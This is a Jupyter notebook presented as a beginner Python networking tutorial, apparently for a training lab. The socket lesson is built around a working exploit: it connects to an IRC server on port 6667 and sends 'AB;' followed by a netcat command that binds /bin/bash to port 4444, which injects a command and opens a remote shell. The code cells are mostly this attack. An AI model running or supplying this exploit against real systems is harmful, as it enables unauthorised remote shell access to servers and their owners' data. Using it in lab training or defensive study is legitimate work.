{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Python Networking"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Dependencies\n",
    "In Python, you need to onboard libraries using the ```import``` command.  For networking the ```socket``` library is necessary."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "import socket"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Another useful library is the ```time``` library, which includes the ```sleep``` command."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "from time import sleep #not actually used in this example"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Variables\n",
    "\n",
    "In the beginning, we'll set some variables.  The first few are easy.  The IP Address is a string."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "SERVER = '172.16.253.145'\n",
    "PORT = 6667\n",
    "LPORT = 4444  # This is an integer, not a string"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Next, a slightly more complicated variable.  Here is a string, concatenated with the value of the LPORT variable.\n",
    "Since the value of LPORT is an integer, it needs to be converted to a string.  We do so by using the [format](https://pyformat.info) mechanism."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "PAYLOAD = \"/bin/nc -l -p {0} -e /bin/bash\".format(LPORT)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "The ```format``` mechanism takes the parameters passed to it, and replaces placeholders.  The normal placeholder is the ```{0}``` inside the string."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Build the connection\n",
    "Using the socket library, we create a new variable ```IRC``` of the type ```socket```.  \n",
    "```socket(socket.AF_INET, socket.SOCK_STREAM)``` <- This is just the way you initiate the socket. More details [here](https://docs.python.org/2/library/socket.html)."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "IRC = socket.socket(socket.AF_INET, socket.SOCK_STREAM)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "```IRC``` is now an instance of the socket.  We can activate methods of this variable to actually start the connection, and receive data."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "IRC.connect((SERVER, PORT))\n",
    "print(IRC.recv(1024))"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Send and Receive Data\n",
    "We can also send data using the ```send``` method.\n",
    "\n",
    "Note: It's vital that data is sent with a carriage return."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "print(\"Sending exploit...\")\n",
    "IRC.send(str.encode(\"AB;\" + PAYLOAD + \"\\n\"))\n",
    "print(\"Exploit sent.\")\n",
    "print(IRC.recv(1024))"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Now, close the connection to free up a socket and memory on your computer."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "IRC.close()"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.7.1"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
